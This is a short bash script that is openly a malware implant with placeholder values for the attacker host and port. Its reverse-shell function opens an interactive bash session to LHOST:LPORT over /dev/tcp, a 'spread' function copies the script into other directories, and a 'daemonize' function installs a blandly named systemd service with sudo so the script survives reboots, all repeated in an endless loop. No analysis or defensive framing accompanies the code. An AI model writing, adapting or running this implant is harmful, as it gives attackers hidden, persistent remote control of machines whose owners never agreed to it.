#!/bin/bash

# Reverse shell
revshell() {

    # Declare IP and Port
    local ip="LHOST"
    local port="LPORT"

    nc -z -w 1 "$ip" "$port"

    if [ $? -eq 0 ]; then
    # Bash reverse shell one-liner
        bash -i >& /dev/tcp/"${ip}"/"${port}" 0>&1
    fi

}

# List of random destination names
destinations=("/different" "/destinations")
filename="filename"

# Choose a random destination from the list
destination="${destinations[RANDOM % ${#destinations[@]}]}"

# Sort of worm to keep the script alive
spread() {
    if [ ! -f "${destination}/${filename}" ]; then
        mkdir -p "$destination"

        # Copy the script to the destination
        cp "$0" "${destination}/${filename}"

        #make executable
        chmod +x "${destination}/${filename}"
    fi
}

daemonize() {
    service_name="clever_name"

    # Check if the service file exists
    if [ ! -f "/etc/systemd/system/${service_name}.service" ]; then
        # Create the service file
        cat <<EOF | sudo tee "/etc/systemd/system/${service_name}.service" > /dev/null
[Unit]
Description=Service_name
# After=

[Service]
ExecStart=${destination}/${filename}
Restart=always

[Install]
WantedBy=multi-user.target
EOF
        sudo systemctl daemon-reload
        sudo systemctl enable "${service_name}"
        sudo systemctl restart "${service_name}"

    fi
}

while [ true ]; do
    spread
    daemonize
    revshell
    sleep 10
done
